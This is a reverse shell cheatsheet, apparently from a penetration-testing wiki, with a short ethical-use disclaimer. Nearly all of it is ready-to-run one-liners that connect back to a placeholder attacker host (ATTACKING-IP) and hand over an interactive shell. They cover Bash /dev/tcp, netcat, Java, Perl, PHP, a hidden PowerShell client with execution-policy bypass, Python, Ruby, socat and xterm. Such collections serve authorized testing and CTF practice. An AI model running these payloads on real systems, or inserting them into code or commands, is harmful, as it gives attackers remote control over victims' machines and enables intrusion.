Reverse Shell cheatsheet
=======

__Attention: The articles published on this wiki are for education purpose, to use during a CTF or for an authorized penetrationtest. By using the wiki, you've agreed to use this knowledge in an ethical way and do not evil in any perspective.__

Don't forget to start the listener, or nothing will be catched by any shell!

RPORT should be replaced with the port number where you try to connect to. This means it should be the port number where your listener is listening too.

Bash Reverse Shells
---------
```bash
exec /bin/bash 0&0 2>&0
```
```bash
bash -i >& /dev/tcp/ATTACKING-IP/RPORT 0>&1
```
```bash
0<&196;exec 196<>/dev/tcp/ATTACKING-IP/RPORT; sh <&196 >&196 2>&196
```
```bash
exec 5<>/dev/tcp/ATTACKING-IP/RPORT
cat <&5 | while read line; do $line 2>&5 >&5; done  
```
or:
```bash
while read line 0<&5; do $line 2>&5 >&5; done
```
```bash
bash -i >& /dev/tcp/ATTACKING-IP/RPORT 0>&1
```

Netcat Reverse Shell
---------

```bash
nc -e /bin/sh ATTACKING-IP RPORT
nc -e /bin/bash ATTACKING-IP RPORT
nc -c bash ATTACKING-IP RPORT
```
```bash
/bin/sh | nc ATTACKING-IP RPORT
```




JAVA
---------
```bash
r = Runtime.getRuntime()
p = r.exec(["/bin/bash","-c","exec 5< >/dev/tcp/ATTACKING-IP/RPORT;cat <& 5 | while read line; do \$line 2>&5 >&5; done"] as String[])
p.waitFor()
```

Perl
---------
```bash
perl -e 'use Socket;$i="ATTACKING-IP";$p=RPORT;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'
```

PHP
---------
```bash
php -r '$sock=fsockopen("ATTACKING-IP",RPORT);exec("/bin/sh -i <&3 >&3 2>&3");'
```

Powershell
---------
```bash
powershell -NoP -NonI -W Hidden -Exec Bypass -Command New-Object System.Net.Sockets.TCPClient("ATTACKING IP",RPORT);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2  = $sendback + "PS " + (pwd).Path + "> ";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()
```

Python
---------
```bash
python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("ATTACKING-IP",RPORT));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
```

Ruby
---------
```bash
ruby -rsocket -e'f=TCPSocket.open("ATTACKING-IP",RPORT).to_i;exec sprintf("/bin/sh -i <&%d >&%d 2>&%d",f,f,f)'
```

SOCAT
---------
```bash
socat tcp-connect:ATTACKING-IP:RPORT system:/bin/sh
```

XTERM
---------
```bash
xterm -display ATTACKING-IP:RPORT
```